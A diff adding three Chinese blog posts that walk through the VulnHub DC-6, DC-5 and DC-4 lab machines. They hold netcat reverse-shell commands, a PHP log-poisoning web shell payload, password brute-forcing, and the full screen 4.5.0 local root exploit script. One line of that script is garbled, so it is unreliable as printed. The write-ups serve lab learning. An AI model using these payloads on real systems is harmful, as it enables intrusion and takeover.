@@ -226,6 +226,518 @@
             
 
   
+    <article id="post-DC6靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/02/22/DC6%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC6靶机渗透记录</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/02/22/DC6%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+        <time datetime="2021-02-22T10:34:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-22</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <center>DC6靶机渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>啊，老套路了，发现ip，ip扫描，目录爆破，依次来一遍</p>
+<p><img src="/../images/image-20210222161138038.png" alt="image-20210222161138038"></p>
+<p>本机ip是<code>192.168.1.11</code>。因为不用担心被反追踪，所以没有隐藏自己的扫描痕迹，如下命令可以扫全端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.1.11</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222161457994.png" alt="image-20210222161457994"></p>
+<p>很棒，经典22和80端口。web端访问来康康，这里出了个小问题，直接访问<code>192.168.1.10</code>没法儿正常访问，只好添加<code>hosts</code>记录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.1.10 wordy#最后添加这个</span><br></pre></td></tr></table></figure>
+
+<p>OK打开了网站发现是wordpress的站，那就有思路了哇，先目录爆破一波。</p>
+<p><img src="/../images/image-20210222162536804.png" alt="image-20210222162536804"></p>
+<p>这里也是试了dirb和dirsearch，发现应对wp站的扫描还是dirsearch强一些。。。</p>
+<p><img src="/../images/image-20210222163045216.png" alt="image-20210222163045216"></p>
+<p>结果显示就是正常的wordpress站，没有更改后台目录名儿什么的。那就针对wp来进一步扫描吧，首先枚举用户名，顺便确认了一下版本是5.1.1</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -e u</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222164311923.png" alt="image-20210222164311923"></p>
+<p>用户还蛮多的哇。</p>
+<h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><p>根据前面的welcome信息我猜这个思路可能是从插件寻找突破点，所以又扫了一下该站的插件</p>
+<p><img src="/../images/image-20210222170642823.png" alt="image-20210222170642823"></p>
+<p>似乎没什么用。。。</p>
+<p>这里批评一下作者，他在vulnhub上放了一个clue，，，然鹅一般人都不太注意好吧。。。这要是上来莽着爆破密码得多长时间:-(</p>
+<p><img src="/../images/image-20210222163843763.png" alt="image-20210222163843763"></p>
+<p>这里不用hydra了（主要是懒得打开burp抓包构造。。。），试试wpscan自带的爆破密码好不好用XD</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt#users.txt是我们枚举出来的哪些用户名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222165530308.png" alt="image-20210222165530308"></p>
+<p>额，速度也就一般，估计只能适用wp对比之下hydra还是普适一些，强一些。OK，只爆出来了一个<code>mark:helpdesk01</code>登录上去康康。</p>
+<p><img src="/../images/image-20210222165758685.png" alt="image-20210222165758685"></p>
+<p>莫得发现，而且这次连xss都打不出来了。所以，搜索大佬们的解答吧。。。:-(还真是插件的漏洞，，，就那个记录ip的工具<code>activity monitor</code>。搜索漏洞库有了结果</p>
+<p><img src="/../images/image-20210222171334907.png" alt="image-20210222171334907"></p>
+<p>从漏洞库拷贝到我们的文件夹进行修改</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html /home/xxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222172022305.png" alt="image-20210222172022305"></p>
+<p>可以看出来，该html脚本利用nc反弹shell，修改对应的参数，再在浏览器浏览本地的这个html文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///home/xxx/xxx/45274.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222172531969.png" alt="image-20210222172531969"></p>
+<p>开启本地nc监听后，再点击提交。</p>
+<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>哇这里好气啊，不知道为什么我的nc反弹shell操作加了<code>-lnvp</code>指令就没法反弹，反而burp抓包修改了反弹命令就成了</p>
+<p>这里真的好奇怪啊？？？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baidu.com| nc 192.168.1.11 6789 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222174900827.png" alt="image-20210222174900827"></p>
+<p><img src="/../images/image-20210222174656434.png" alt="image-20210222174656434"></p>
+<p>然后是交互式shell，得到之后就在靶机里面来回乱转找信息XD</p>
+<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p><img src="/../images/image-20210222175358917.png" alt="image-20210222175358917"></p>
+<p>很快啊，在mark的一个txt里发现了另一个账号密码XD<code>graham:GSo7isUM1D4</code>，然后换壳啦</p>
+<p><img src="/../images/image-20210222175640554.png" alt="image-20210222175640554"></p>
+<p>经过一系列查找，并通过<code>sudo -l</code>命令也发现了在jens目录下的一个脚本拥有无密码运行的root权限，可以作为突破点。</p>
+<p>直接追加写入<code>echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</code>，再用jens用户运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>这里会直接转换为jens的shell</p>
+<p><img src="/../images/image-20210222180459639.png" alt="image-20210222180459639"></p>
+<p>查询可以利用的SUID权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222180746684.png" alt="image-20210222180746684"></p>
+<p>好吧，很多熟悉的SUID权限可以试试，但图个省事，，，nmap显然可以无密码运行，在低版本中可以写个脚本用nmap的脚本扫描方式进行提权。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt;root.nse#后缀为nse</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210222182715381.png" alt="image-20210222182715381"></p>
+<p>嗯，接下来运行就可。。。哇这，简单的有点不敢相信。。。</p>
+<p><img src="/../images/image-20210222182910936.png" alt="image-20210222182910936"></p>
+<p>OK成了XD</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>嗯DC系列都是属于适合新手的靶机，且适合CTF选手，然后这个靶机应该是介绍了一种插件漏洞的利用方式，然后介绍了低版本的nmap提权手段。</p>
+<p>嗯，也算小有收获吧XD</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/02/22/DC6%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DC5靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/02/19/DC5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC5靶机渗透记录</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/02/19/DC5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+        <time datetime="2021-02-18T19:40:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-19</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <center>DC-5渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老姿势了，信息收集三板斧<code>netdiscover</code>，<code>nmap</code>和<code>dirsearch</code>。（因为靶机和测试机都在同一个局域网内所以我用了netdiscover来代替）</p>
+<p><img src="/../images/image-20210218154622630.png" alt="image-20210218154622630"></p>
+<p>靶机ip<code>192.168.1.12</code>，测试机ip<code>192.168.1.11</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.12 -p 1-10000</span><br></pre></td></tr></table></figure>
+
+<p>nmap扫描，因为怕出现上次的端口迁移，这里我扫了前一万个端口</p>
+<p><img src="/../images/image-20210218154932767.png" alt="image-20210218154932767"></p>
+<p>发现不光开放了80端口，还有一个111的端口也开放了，先记下来以备后用。浏览一下对应的web端，在祭出<code>dirsearch</code>扫描一波。</p>
+<p><img src="/../images/image-20210218155640012.png" alt="image-20210218155640012"></p>
+<p>嗯，光看扫描结果有点惨淡。</p>
+<h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><p>web端是nginx的中间件，php语言，在Contact处有一个交互页面，可以提交内容，估计这里就是可利用点</p>
+<p>随手交了一个内容，get传参，上方网址变为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.12/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E</span><br></pre></td></tr></table></figure>
+
+<p>多次刷新<code>thankyou.php</code>页面发现了一个小细节XD。页面最下面的<code>Copyright@2017</code>的年份会变化。来来来我们研究一下这个页面。</p>
+<p>网站是php写的，但是我们没有扫出来thankyou.php，所以要换一个扫描，这里使用了dirb工具，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44912169/article/details/105655195">我是链接</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.12/ /usr/share/wordlists/dirb/big.txt -X .php -S</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210218165858238.png" alt="image-20210218165858238"></p>
+<p><code>/footer.php</code>会变动，推测是文件包含漏洞，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Excellent-person/articles/12324451.html">我是链接</a></p>
+<blockquote>
+<p>严格来说，文件包含漏洞是“代码注入”的一种。在“注入攻击”一章中，曾经提到过“代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行。“代码注入”的典型代表就是文件包含（File Inclusion）。文件包含可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。</p>
+<p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), …</p>
+<p>JSP&#x2F;Servlet：ava.io.File(), java.io.Fil-eReader(), …</p>
+<p>ASP：include file, include virtual, …</p>
+<p>在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了，因为黑客们在各种各样的PHP应用中挖出了数不胜数的文件包含漏洞，且后果都非常严重。</p>
+<p>文件包含是PHP的一种常见用法，主要由4个函数完成：</p>
+<p>include()</p>
+<p>require()</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。这一特性，在实施攻击时将非常有用。比如以下代码：</p>
+<?php
+
+include($_GET[test]);
+
+?>
+
+<p>要想成功利用文件包含漏洞，需要满足下面两个条件：</p>
+<p>（1）include()等函数通过动态变量的方式引入需要包含的文件；</p>
+<p>（2）用户能够控制该动态变量。</p>
+</blockquote>
+<p>先确定该传参变量名，可以考虑使用burp爆破变量名，我们首先确定了index.php的存在，所以构造</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/thankyou.php?§A§=index.php</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210218183336907.png" alt="image-20210218183336907"></p>
+<p>可知动态变量名为file。然后就用该变量访问敏感信息。</p>
+<p><img src="/../images/image-20210218180910850.png" alt="image-20210218180910850"></p>
+<p>有了！考虑该服务器没有登录框，也没开放ssh端口，这种情况下要让我们获得shell有两种想法</p>
+<ol>
+<li>写入一句话木马，webshell工具链接</li>
+<li>写入nc回弹shell</li>
+</ol>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>由nmap结果我们可知，nginx的中间件会有<code>access.log</code>这个文件来记录访问信息，同时会有<code>error.log</code>这个文件来记录错误信息。这里构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="meta">?&gt;</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>再通过<code>GET /thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code>查看回显来看我们是否利用了该文件包含漏洞。回显如下</p>
+<p><img src="/../images/image-20210219020426257.png" alt="image-20210219020426257"></p>
+<p>发现有回显！说明我们调用的cmd参数可以作为命令来远程执行，接下来可以直接传递nc命令来反弹shell。我也试过连接webshell工具。但是不知道为什么，蚁剑和冰蝎都无法连接上去QAQ，太奇怪了。</p>
+<blockquote>
+<p>访问日志主要记录客户端的请求。客户端向Nginx服务器发起的每一次请求都记录在这里。客户端IP，浏览器信息，referer，请求处理时间，请求URL等都可以在访问日志中得到。</p>
+</blockquote>
+<p><img src="/../images/image-20210218184736084.png" alt="image-20210218184736084"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=/<span class="keyword">var</span>/log/nginx/error.log&amp;cmd=nc -e /bin/sh <span class="number">192.168</span>.<span class="number">1.11</span>  <span class="number">5200</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>使用如上命令来nc反弹shell，当然，测试机上要先</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 5200</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210219021506496.png" alt="image-20210219021506496"></p>
+<p>如此以来，我们成功得到shell！</p>
+<p>换成交互式<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>GET！XD</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先码一个超强的提权总和 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/261271.html">我是链接</a></p>
+<p>然后就是常规的提权操作啦，先查询s权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20210219021839831.png" alt="image-20210219021839831"></p>
+<p>这里参考了一下eson的wp，发现<code>exim4</code>有一个46996.sh的提权脚本可利用，思路先往这里放一放XD</p>
+<p>首先发现exim的版本<code>exim4 --version</code></p>
+<p><img src="/../images/image-20210219022621406.png" alt="image-20210219022621406"></p>
+<p>分析了一下46996.sh的版本，发现不是很匹配，，，所以换了上文链接中的screen提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210219024005904.png" alt="image-20210219024005904"></p>
+<p>这里注意一下，msf的提权脚本路径<code>/usr/share/exploitdb/exploits</code>后加上不同的路径</p>
+<p>这里我们打开了41154.sh文件，发现它的运行方式有点东西</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">screenroot.sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">setuid screen v4.5.0 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HACK THE PLANET</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">~ infodox (25/1/2017)</span> </span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里开始，一</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里结束，一</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c#命令行输入此命令生成libhax.so文件</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里开始，二</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里结束，二</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c#同命令行输入</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshellrocat &lt;&lt; EOF &gt; /tmp/libhax.c /tmp/libhax.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>就是说要本地分两部分gcc编译，编译完的文件在上传到靶机。</p>
+<p>上传使用nc传文件，方便且不用Python部署服务器啦，ftp传递啦之类的</p>
+<p>kali：</p>
+<ul>
+<li><code>nc -lnvp 1234 &lt; libhax.so</code> 使用<code>Ctrl+C</code>就可以打断靶机的接收并不影响shell</li>
+<li><code>nc -lnvp 1234 &lt; rootshell</code></li>
+</ul>
+<p>靶机</p>
+<ul>
+<li><code>nc 192.168.1.11 1234 &gt; libhax.so</code></li>
+<li><code>nc 192.168.1.11 1234 &gt; rootshell</code></li>
+</ul>
+<p><strong>注意，这里的操作尽量都在两台机器的&#x2F;tmp文件夹里进行，因为该文件夹下权限较大</strong></p>
+<p>然后再靶机上一次执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br></pre></td></tr></table></figure>
+
+<p>如上命令，最后切换回&#x2F;tmp文件，执行rootshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">./rootshell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210219032958095.png" alt="image-20210219032958095"></p>
+<p>OK！获得最高权限！（研究这个提权脚本浪费了我太长太长时间了XD）</p>
+<p><img src="/../images/image-20210219033138120.png" alt="image-20210219033138120"></p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>很有收获！学会了文件包含漏洞，以及一些提权方式。（终于摆脱了一次爆破密码这种玄学渗透一次XD）</p>
+<p>但是也有点奇怪？为什么我的webshell工具无法连接？？？结果浪费了好长好长时间。</p>
+<p>嘛，暂时就这样吧，毕竟确实学到了一点东西XD</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/02/19/DC5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DC4靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/02/17/DC4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC4靶机渗透记录</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/02/17/DC4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+        <time datetime="2021-02-16T20:19:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-17</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <center>DC-4渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/../images/image-20210217020107897.png" alt="image-20210217020107897"></p>
+<p>同样得到ip地址<code>192.168.1.11</code>，nmap扫描。</p>
+<p><img src="/../images/image-20210217020519266.png" alt="image-20210217020519266"></p>
+<p>发现其开放了22和80端口，以及相对应的版本<code>openSSH</code>和<code>nginx</code>。</p>
+<p>浏览器打开80端口，发现直接是管理员登录窗口，老规矩，<code>dirsearch</code>一波</p>
+<p><img src="/../images/image-20210217020954209.png" alt="image-20210217020954209"></p>
+<p><img src="/../images/image-20210217021357845.png" alt="image-20210217021357845"></p>
+<p>QAQ完，信息太少太少了，登录框也看不出来是什么CMS。那只能瞎猜了？</p>
+<h2 id="网站登录"><a href="#网站登录" class="headerlink" title="网站登录"></a>网站登录</h2><p>弱口令跑一组<code>username=admin&amp;password=admin</code>得到burp的拦截内容，然后我们构造相应的hydra格式去爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 5 -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.1.11 http-post-form &#x27;/login.php:username=^USER^&amp;password=^PASS^:S=logout&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>具体参数意义参考上一篇博文哦</p>
+<p>！很快哇，惊喜就出来了（完，最近太太太依赖爆破密码这种玄学操作了QAQ）</p>
+<p><img src="/../images/image-20210217023351955.png" alt="image-20210217023351955"></p>
+<p>利用跑到的密码登录web</p>
+<p><img src="/../images/image-20210217023644175.png" alt="image-20210217023644175"></p>
+<p>是一个，，，嗯，，，怎么说呢，页面版的命令行界面，同样利用burp构造一些常用的Linux命令，发现respond验证了猜想，如图，传了<code>man ping</code>的命令，回传了结果。</p>
+<p><img src="/../images/image-20210217023959916.png" alt="image-20210217023959916"></p>
+<p>然后有一个思路了！！！nc反弹shell不就行了！<a target="_blank" rel="noopener" href="https://blog.csdn.net/youshaoduo/article/details/88554395">我是链接</a></p>
+<p>以前看到的文章有了用场了，之前也玩过nc在局域网中聊天XD</p>
